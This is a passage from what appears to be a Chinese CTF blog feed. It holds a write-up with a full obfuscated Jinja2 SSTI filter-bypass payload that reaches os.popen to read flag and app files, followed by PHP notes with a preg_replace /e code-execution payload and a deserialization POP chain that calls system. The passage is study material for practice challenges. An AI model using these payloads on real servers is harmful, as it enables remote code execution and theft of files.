class="hljs-keyword">join</span>,chhr(<span class="hljs-number">4</span>６),dict(p=a,y=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #cat app.py</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> six=(ta,kgxg,dict(ap=a,p=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,chhr(<span class="hljs-number">4</span>７),dict(fl<span class="hljs-number">4</span>gfl<span class="hljs-number">4</span>=a,gfl<span class="hljs-number">4</span>g=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">#tac /app/fl4gfl4gfl4g</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> sss=(ta,kgxg,dict(ap=a,p=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,chhr(<span class="hljs-number">4</span>７),dict(fl<span class="hljs-number">44</span>=a,<span class="hljs-number">44</span>g=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">#tac /fl4444g</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cmd=pp(six)<span class="hljs-punctuation">|</span>attr(re)()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #执行命令</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;cmd&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>无注释版本，可直接食用</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">/secr3ttt?klf=</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> po=dict(po=<span class="hljs-number">1</span>,p=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> oo=dict(o=a,s=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> p=dict(po=a,pen=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ch=dict(ch=a,r=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> <span class="hljs-keyword">in</span>=(a,a,dict(<span class="hljs-keyword">in</span>=a,it=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> gl=(a,a,dict(glob=a,als=q)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ge=(a,a,dict(geti=a,tem=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> bu=(a,a,dict(bui=a,ltins=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> im=(a,a,dict(imp=a,ort=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cl=(a,a,dict(cla=a,ss=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> su=(a,a,dict(subcla=a,sses=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ba=(a,a,dict(ba=a,se=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> x=jay<span class="hljs-number">17</span><span class="hljs-punctuation">|</span>attr(cl)<span class="hljs-punctuation">|</span>attr(ba)<span class="hljs-punctuation">|</span>attr(su)()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> chhr=()<span class="hljs-punctuation">|</span>attr(cl)<span class="hljs-punctuation">|</span>attr(ba)<span class="hljs-punctuation">|</span>attr(su)()<span class="hljs-punctuation">|</span>attr(ge)(<span class="hljs-number">117</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-keyword">in</span>)<span class="hljs-punctuation">|</span>attr(gl)<span class="hljs-punctuation">|</span>attr(ge)(bu)<span class="hljs-punctuation">|</span>attr(ge)(ch)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> pp=()<span class="hljs-punctuation">|</span>attr(cl)<span class="hljs-punctuation">|</span>attr(ba)<span class="hljs-punctuation">|</span>attr(su)()<span class="hljs-punctuation">|</span>attr(ge)(<span class="hljs-number">117</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-keyword">in</span>)<span class="hljs-punctuation">|</span>attr(gl)<span class="hljs-punctuation">|</span>attr(ge)(p)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> re=dict(re=a,ad=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> en=dict(en=a,v=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ta=dict(ta=a,c=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ca=dict(ca=a,t=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> f=<span class="hljs-number">4</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> g=dict(g=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ff=(f,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fff=(ff,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ffff=(fff,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fl=dict(f=<span class="hljs-number">1</span>,l=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fg=(fl,ffff,g)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> kgxg=(chhr(<span class="hljs-number">3</span>２),chhr(<span class="hljs-number">4</span>７))<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> tf=(ta,kgxg,fl)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> tff=(ta,kgxg,fg)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cff=(ca,kgxg,fg)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ll=dict(l=a,s=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> lll=(ll,kgxg)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> la=(ll,kgxg,dict(ap=a,p=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ha=dict(ha=a,hahaha=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> th=(ta,chhr(<span class="hljs-number">3</span>２),ha)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ym=(dict(ca=a,t=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,chhr(<span class="hljs-number">3</span>２),dict(ap=a,p=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,chhr(<span class="hljs-number">4</span>６),dict(p=a,y=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> six=(ta,kgxg,dict(ap=a,p=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,chhr(<span class="hljs-number">4</span>７),dict(fl<span class="hljs-number">4</span>gfl<span class="hljs-number">4</span>=a,gfl<span class="hljs-number">4</span>g=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cmd=pp(cff)<span class="hljs-punctuation">|</span>attr(re)()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;cmd&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>一些数字会被检测的话，可以参考下面思路，具体题目具体分析</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> sv=lipsum<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list<span class="hljs-punctuation">|</span>attr(b)(<span class="hljs-number">36</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #获取数字7，因为斜杠\的ascii是47，这里7是会被检测</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> f=<span class="hljs-number">4</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #获取4</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> g=dict(g=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #获取g</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ff=(f,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> # 44</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fff=(ff,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> # 444</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fl=dict(f=<span class="hljs-number">1</span>,l=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #fl</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gg=(f,dict(g=<span class="hljs-number">1</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #flag的名字叫 fl4gfl4gfl4g</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fg=(fl,gg,fl,gg,fl,gg)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fg=(fl,fff,g)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ap=dict(ap=<span class="hljs-number">1</span>,p=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #flag在/app路由下</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> n=(f,sv)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #组成47的数字，这个int有必要</span><br></code></pre></td></tr></table></figure><p>自己复现时自己用的文件名字</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">构造并读取 #fl444g</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> f=<span class="hljs-number">4</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> g=dict(g=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ff=(f,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fff=(ff,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ffff=(fff,f)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fl=dict(f=<span class="hljs-number">1</span>,l=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fg=(fl,ffff,g)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;fg&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>拼接构建的一般步骤:拼接<strong>函数</strong>+拼接<strong>文件名</strong>+<strong>全角半角</strong>绕过+获取<strong>字符</strong></p><h3 id="klf-3"><a href="#klf-3" class="headerlink" title="klf_3"></a>klf_3</h3><p>同klf_2</p>]]></content>
    
    
    <categories>
      
      <category>CTF_WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php_learn</title>
    <link href="/2023/11/05/php-learn/"/>
    <url>/2023/11/05/php-learn/</url>
    
    <content type="html"><![CDATA[<h1 id="php的一些知识点"><a href="#php的一些知识点" class="headerlink" title="php的一些知识点"></a>php的一些知识点</h1><h2 id="一些函数漏洞"><a href="#一些函数漏洞" class="headerlink" title="一些函数漏洞"></a>一些函数漏洞</h2><h3 id="ban了一堆函数怎么办"><a href="#ban了一堆函数怎么办" class="headerlink" title="ban了一堆函数怎么办"></a>ban了一堆函数怎么办</h3><p><a href="https://blog.csdn.net/weixin_46236101/article/details/111772150?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-1-111772150-blog-110240955.235%5Ev38%5Epc_relevant_sort_base1&spm=1001.2101.3001.4242.2&utm_relevant_index=4">php中函数禁用绕过的原理与利用_ctf ini_set(‘open_basedir’, ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp&#x2F;‘-CSDN博客</a></p><h3 id="file-put-contents利用技巧"><a href="#file-put-contents利用技巧" class="headerlink" title="file_put_contents利用技巧"></a>file_put_contents利用技巧</h3><p>(php:&#x2F;&#x2F;filter协议):<a href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contents利用技巧(php:&#x2F;&#x2F;filter协议） - yokan - 博客园 (cnblogs.com)</a></p><h3 id="preg-replace漏洞"><a href="#preg-replace漏洞" class="headerlink" title="preg_replace漏洞"></a>preg_replace漏洞</h3><p><a href="https://blog.csdn.net/weixin_49656607/article/details/119833707">深入研究preg_replace \e模式下的代码执行_preg_replace()执行问题-CSDN博客</a></p><p>常用payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=&#123;<span class="hljs-variable">$&#123;</span>phpinfo()&#125;&#125;<br></code></pre></td></tr></table></figure><p>post模式下同理，一个传匹配模式，然后传恶意代码</p><h3 id="parse-url函数的绕过-可以套娃"><a href="#parse-url函数的绕过-可以套娃" class="headerlink" title="parse_url函数的绕过(可以套娃)"></a>parse_url函数的绕过(可以套娃)</h3><p><a href="https://blog.csdn.net/q1352483315/article/details/89672426">parse_url函数的解释和绕过-CSDN博客</a></p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>好文:<a href="https://blog.csdn.net/MrWangisgoodboy/article/details/130146658?ops_request_misc=&request_id=&biz_id=102&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%8F%98%E9%87%8F%E5%90%8D%E6%A3%80%E6%B5%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-130146658.nonecase&spm=1018.2226.3001.4187">php(phar)反序列化漏洞及各种绕过姿势_php反序列化漏洞解决方案_奔跑的蜗牛.的博客-CSDN博客</a></p><h3 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h3><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>例题参考<strong>moectf2023</strong>和<strong>newstarctf2023week4</strong>的一道题</p><h3 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast_destruct"></a>fast_destruct</h3><p>标准做法(newstarctf2023wee4一题)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span> </span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>; <br>&#125; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span> </span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>; <br>&#125; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span> </span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;ls&quot;</span>; <br>&#125; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span> </span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>; <br>&#125; <br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>;<br><span class="hljs-variable">$obj</span> -&gt; errMsg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj -&gt; func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj -&gt; func -&gt; obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj -&gt; func -&gt; obj -&gt; func = <span class="hljs-string">&quot;system&quot;</span>; <br><span class="hljs-variable">$obj</span> -&gt; errMsg -&gt; obj -&gt; func -&gt; obj -&gt; <span class="hljs-keyword">var</span> = <span class="hljs-string">&quot;cat /f*ag&quot;</span>; <br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$obj</span>; <span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;i:0&quot;</span>, <span class="hljs-string">&quot;i:1&quot;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h4 id="1-修改序列化数字元素个数"><a href="#1-修改序列化数字元素个数" class="headerlink" title="1.修改序列化数字元素个数"></a>1.修改序列化数字元素个数</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">newstarctf2023wee4一题<br><br>原paylaod:O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span 